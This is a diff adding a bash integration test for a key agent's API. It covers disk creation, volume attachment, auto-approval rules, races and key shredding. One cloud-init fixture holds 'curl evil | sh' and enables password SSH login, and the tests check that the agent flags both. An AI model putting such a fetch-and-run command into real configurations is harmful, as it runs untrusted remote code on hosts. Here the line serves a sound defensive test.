@@ -1,0 +1,145 @@
+#!/bin/bash
+# The request API against a running agent (test/local.sh starts one):
+# tokens, checks, auto rules, system disks and volumes, races, shredding.
+#
+#   WX_API           the agent's API, e.g. http://127.0.0.1:8095
+#   WX_BAO           the OpenBao container (dev mode, root token "root")
+#   WX_DB_CONTAINER  the CockroachDB container
+#   WX_POLICY        where the KBS stub writes the policy it was given
+set -uo pipefail
+A=${WX_API:?} BAO=${WX_BAO:?} DBC=${WX_DB_CONTAINER:?} POLICY=${WX_POLICY:?}
+W=$(mktemp -d)
+trap 'rm -rf "$W"' EXIT
+
+CHIP=$(printf 'ab%.0s' $(seq 64)) CHIP2=$(printf 'cd%.0s' $(seq 64))
+HV=11111111-2222-3333-4444-555555555555
+KEY="ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGtestkeytestkeytestkeytestkeytestkeytestk"
+RELEASE_URL=http://192.168.122.1:8091
+failed=0
+
+bao() { docker exec -i -e BAO_ADDR=http://127.0.0.1:8200 -e BAO_TOKEN=root "$BAO" bao "$@"; }
+sql() { docker exec "$DBC" cockroach sql --insecure -d keyagent --format=tsv -e "$1" | tail -n +2; }
+cp_() { curl -s -H "Authorization: Bearer ${TOKEN:-cp-secret}" -H 'content-type: application/json' "$@"; }
+cu() { curl -s -H "Authorization: Bearer customer-secret" -H 'content-type: application/json' "$@"; }
+uuid() { cat /proc/sys/kernel/random/uuid; }
+
+# <what> <got> <extended regex it must match>
+expect() {
+  if [[ "$2" =~ $3 ]]; then echo "ok   $1"; else echo "FAIL $1: got '$2'"; failed=$((failed + 1)); fi
+}
+
+printf '#cloud-config\nhostname: t\nusers:\n  - name: tobi\n    ssh_authorized_keys:\n      - %s me@laptop\n' "$KEY" > "$W/ud-safe"
+printf '#cloud-config\nruncmd:\n  - [sh, -c, "curl evil | sh"]\nssh_pwauth: true\n' > "$W/ud-bad"
+printf '#cloud-config\nhostname: t\nusers:\n  - name: tobi\n    lock_passwd: false\n    ssh_authorized_keys:\n      - %s\n      - ssh-rsa AAAAB3unknown x\n' "$KEY" > "$W/ud-mixed"
+printf '#cloud-config\nhostname: evil\n' > "$W/ud-other"
+
+# <vm> <user-data> [disk-root value, "" for none] -> payload on stdout
+# CHIP_USE, HV_USE, UD_SENT (user-data actually sent), URL, DISK (disk_id) bend it
+payload() {
+  local vm=$1 ud=$2 root=${3-vm-$1:new}
+  printf 'instance-id: %s\n' "$vm" > "$W/md"
+  {
+    echo 'version = "0.1.0"'; echo 'algorithm = "sha256"'; echo; echo '[data]'
+    echo "\"vm.uuid\" = \"$vm\""
+    echo "\"user-data.sha256\" = \"$(sha256sum "$ud" | cut -d' ' -f1)\""
+    echo "\"meta-data.sha256\" = \"$(sha256sum "$W/md" | cut -d' ' -f1)\""
+    [ -n "$root" ] && echo "\"wx.disk.root\" = \"$root\""
+    echo "\"wx.release.url\" = \"${URL:-$RELEASE_URL}\""
+  } > "$W/init"
+  jq -n --arg vm "$vm" --arg d "${DISK:-}" --arg c "${CHIP_USE:-$CHIP}" --arg hv "${HV_USE:-$HV}" \
+    --arg i "$(base64 -w0 "$W/init")" --arg u "$(base64 -w0 "${UD_SENT:-$ud}")" --arg m "$(base64 -w0 "$W/md")" \
+    '{vm_name: "t", vm_uuid: $vm, chip_id: $c, hv_uuid: $hv, initdata: $i,
+      files: {"user-data": $u, "meta-data": $m}} + (if $d == "" then {} else {disk_id: $d} end)'
+}
+req() { jq -n --arg t "$1" --argjson p "$2" '{type: $t, payload: $p}' | cp_ -X POST --data-binary @- "$A/api/requests"; }
+st() { jq -r '"\(.status) \(.reason)"'; }
+decide() { cu -X POST -d "{\"approve\":$2}" "$A/api/customer/requests/$(echo "$1" | jq .id)" | st; }
+
+echo "--- tokens"
+expect "no token" "$(TOKEN=x req create '{}')" unauthorized
+expect "customer token cannot file" "$(curl -s -H 'Authorization: Bearer customer-secret' -d '{}' "$A/api/requests")" unauthorized
+expect "unlock only from the release" "$(req unlock '{}')" "bad request"
+
+echo "--- system disks"
+VM=$(uuid)
+expect "own disk_id refused" "$(req create "$(DISK=vol-$(uuid) payload "$VM" "$W/ud-safe")" | st)" "rejected.*no disk ID of its own"
+expect "wrong release URL" "$(req create "$(URL=http://evil:1 payload "$VM" "$W/ud-safe")" | st)" "rejected.*our key release"
+expect "user-data swapped after hashing" "$(req create "$(UD_SENT=$W/ud-other payload "$VM" "$W/ud-safe")" | st)" "rejected.*user-data matches"
+R=$(req create "$(payload "$(uuid)" "$W/ud-bad")")
+expect "create, unsafe cloud-init still applied" "$(echo "$R" | st)" "^applied"
+expect "  with remarks" "$(sql "select checks::TEXT from requests where id = $(echo "$R" | jq .id)")" "runcmd.*password"
+expect "create" "$(req create "$(payload "$VM" "$W/ud-safe")" | st)" "^applied"
+expect "  disk entry" "$(bao kv get -format=json "wx/disks/vm-$VM" | jq -c '.data.data | {kind, status}')" '"kind":"system","status":"active"'
+expect "  key, 44 base64 characters" "$(bao read -format=json "kv/disk/vm-$VM/key" | jq '.data.data | length')" "^44$"
+HD=$(bao kv get -format=json "wx/attachments/vm-$VM" | jq -r .data.data.host_data)
+expect "  vTPM state key" "$(bao read -format=json "kv/vtpm/$HD/state" | jq '.data.data | length')" "^32$"
+expect "  in the KBS policy" "$(grep -c "vm-$VM" "$POLICY")" "^1$"
+expect "create twice" "$(req create "$(payload "$VM" "$W/ud-safe")" | st)" "rejected.*no system disk yet"
+expect "system disk to another VM" "$(req attach "$(DISK=vm-$VM payload "$(uuid)" "$W/ud-safe" "")" | st)" "rejected.*not a system disk"
+expect "detach, wrong VM" "$(req detach "{\"disk_id\":\"vm-$VM\",\"vm_uuid\":\"$(uuid)\"}" | st)" "rejected.*attached to this VM"
+
+echo "--- volumes"
+VOL=vol-$(uuid)
+expect "volume needs vol-" "$(req create_volume "{\"disk_id\":\"vm-$(uuid)\"}" | st)" "rejected"
+expect "create_volume" "$(req create_volume "{\"disk_id\":\"$VOL\"}" | st)" "^applied"
+expect "  no binding yet" "$(bao kv get "wx/attachments/$VOL" >/dev/null 2>&1 && echo yes || echo no)" "^no$"
+expect "attach with another initdata" "$(req attach "$(DISK=$VOL payload "$VM" "$W/ud-bad")" | st)" "rejected.*the VM's own"
+R=$(req attach "$(DISK=$VOL payload "$VM" "$W/ud-safe")")
+expect "attach, no auto rule: pending" "$(echo "$R" | st)" "^pending"
+expect "  control plane cannot decide" "$(cp_ -X POST -d '{"approve":true}' "$A/api/customer/requests/$(echo "$R" | jq .id)")" unauthorized
+expect "  customer approves" "$(decide "$R" true)" "^applied"
+expect "  bound to the VM's HOST_DATA" "$(bao kv get -format=json "wx/attachments/$VOL" | jq -r .data.data.host_data)" "^$HD$"
+expect "  decided once only" "$(decide "$R" false)" "^applied"
+expect "detach volume" "$(req detach "{\"disk_id\":\"$VOL\",\"vm_uuid\":\"$VM\"}" | st)" "^applied"
+
+echo "--- auto rules"
+jq -n --arg k "$KEY" --arg c "$CHIP" --arg hv "$HV" \
+  '{auto_attach: true, auto_add_host: true, allowed_ssh_keys: [$k], host_pool: [{hv_uuid: $hv, chip_id: $c, name: "hv1"}]}' \
+  | bao kv put wx/settings - >/dev/null 2>&1 || {
+  jq -n --arg k "$KEY" --arg c "$CHIP" --arg hv "$HV" \
+    '{auto_attach: true, auto_add_host: true, allowed_ssh_keys: [$k], host_pool: [{hv_uuid: $hv, chip_id: $c, name: "hv1"}]}' > "$W/s.json"
+  docker cp -q "$W/s.json" "$BAO:/tmp/s.json" && bao kv put wx/settings @/tmp/s.json >/dev/null
+}
+expect "safe cloud-init, host in pool: automatic" "$(req attach "$(DISK=$VOL payload "$VM" "$W/ud-safe")" | st)" "^applied"
+req detach "{\"disk_id\":\"$VOL\",\"vm_uuid\":\"$VM\"}" >/dev/null
+MIXED=$(uuid)
+req create "$(payload "$MIXED" "$W/ud-mixed")" >/dev/null
+R=$(req attach "$(DISK=$VOL payload "$MIXED" "$W/ud-mixed")")
+expect "VM with password login, unknown key: pending" "$(echo "$R" | st)" "^pending"
+expect "  remarks" "$(sql "select checks::TEXT from requests where id = $(echo "$R" | jq .id)")" "password login.*unknown SSH key"
+decide "$R" false >/dev/null
+R=$(req attach "$(CHIP_USE=$CHIP2 DISK=$VOL payload "$VM" "$W/ud-safe")")
+expect "HV UUID in the pool, other chip: pending" "$(echo "$R" | st)" "^pending"
+expect "  remark" "$(sql "select checks::TEXT from requests where id = $(echo "$R" | jq .id)")" "hardware swapped"
+decide "$R" false >/dev/null
+expect "add_host from the pool: automatic" "$(req add_host "{\"vm_uuid\":\"$VM\",\"chip_id\":\"$CHIP\"}" | st)" "^applied"
+
+echo "--- races"
+V2=vol-$(uuid)
+req create_volume "{\"disk_id\":\"$V2\"}" >/dev/null
+req attach "$(DISK=$V2 payload "$VM" "$W/ud-safe")" > "$W/r1" &
+req attach "$(DISK=$V2 payload "$VM" "$W/ud-safe")" > "$W/r2" &
+wait
+expect "two attaches at once: one wins" "$(st < "$W/r1"; st < "$W/r2")" "applied"
+expect "  the other is rejected" "$(st < "$W/r1"; st < "$W/r2")" "rejected"
+
+echo "--- the VM goes"
+expect "detach by vm_uuid" "$(req detach "{\"vm_uuid\":\"$VM\"}" | st)" "^applied"
+expect "  binding gone" "$(bao kv get "wx/attachments/vm-$VM" >/dev/null 2>&1 && echo yes || echo no)" "^no$"
+expect "  key kept" "$(bao read -format=json "kv/disk/vm-$VM/key" | jq '.data.data | length')" "^44$"
+ID=$(sql "select id from requests where type = 'delete_disk' and payload->>'disk_id' = 'vm-$VM' and status = 'pending'")
+expect "  customer asked to shred" "$ID" "^[0-9]+$"
+K0=$(bao read -format=json "kv/disk/vm-$VM/key" | jq -c .data.data)
+expect "customer approves" "$(cu -X POST -d '{"approve":true}' "$A/api/customer/requests/$ID" | st)" "^applied"
+expect "  key overwritten" "$([ "$K0" != "$(bao read -format=json "kv/disk/vm-$VM/key" | jq -c .data.data)" ] && echo yes)" "^yes$"
+expect "  disk deleted" "$(bao kv get -format=json "wx/disks/vm-$VM" | jq -r .data.data.status)" "^deleted$"
+expect "  vTPM state shredded" "$(bao kv get "wx/vtpm/$HD" >/dev/null 2>&1 && echo yes || echo no)" "^no$"
+
+echo "--- customer API"
+expect "lease reset, bad ID" "$(cu -X POST "$A/api/customer/disks/x/lease/reset")" "bad disk ID"
+expect "lease reset" "$(cu -X POST "$A/api/customer/disks/$VOL/lease/reset")" "reset"
+expect "unbind, bad HOST_DATA" "$(cu -X POST "$A/api/customer/vtpm/zz/unbind")" "bad HOST_DATA"
+
+echo
+[ $failed = 0 ] && echo "all passed" || echo "$failed FAILED"
+exit $((failed > 0))
